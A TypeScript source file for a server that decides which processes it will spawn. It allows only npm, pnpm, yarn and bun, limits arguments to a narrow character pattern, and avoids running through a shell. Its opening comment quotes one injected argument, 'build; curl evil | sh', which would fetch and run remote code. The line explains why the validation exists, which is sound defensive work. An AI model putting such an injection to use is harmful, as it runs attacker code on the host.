/**
 * What this server will start as a process, and what it will not.
 *
 * The page decides what it *wants* to run — which package manager, which
 * script — and this decides whether that is allowed. The two checks look alike
 * on purpose: a page can be lied to (anyone can post to this endpoint), and the
 * server is the only side whose answer counts.
 *
 * Two rules carry the weight:
 *
 *  - **The command comes from a list.** Not "anything on PATH": this endpoint
 *    exists to install dependencies and run project scripts, and nothing else
 *    needs to be reachable through it.
 *  - **No shell.** `spawn(command, args, { shell: true })` hands the arguments
 *    back to a shell, which reads `build; curl evil | sh` as two commands.
 *    MyCastle ran scripts that way and the script name was executable; without
 *    a shell an argument is an argument, whatever is in it.
 */

/** Package managers, and nothing else. */
export const ALLOWED_COMMANDS = new Set(['npm', 'pnpm', 'yarn', 'bun']);

/**
 * Characters npm uses in a script name, plus what its own flags need.
 *
 * Narrow on purpose. Every additional character would have to be thought
 * through against whatever ends up reading it.
 */
const SAFE_ARGUMENT = /^[A-Za-z0-9][A-Za-z0-9:._=-]{0,63}$/;

export type CommandDecision =
    | { ok: true }
    | { ok: false; reason: string };

export function decideCommand(command: string, args: readonly string[]): CommandDecision {
    if (!ALLOWED_COMMANDS.has(command)) {
        return { ok: false, reason: `Nie uruchamiam „${command}" — dozwolone: ${[...ALLOWED_COMMANDS].join(', ')}.` };
    }
    if (args.length > 8) {
        return { ok: false, reason: 'Za dużo argumentów.' };
    }
    for (const arg of args) {
        // `--frozen-lockfile` and friends: the leading dashes are stripped
        // before the shape is checked, so a flag is judged by its name.
        if (!SAFE_ARGUMENT.test(arg.replace(/^--?/, ''))) {
            return { ok: false, reason: `Niedozwolony argument: ${JSON.stringify(arg)}` };
        }
    }
    return { ok: true };
}
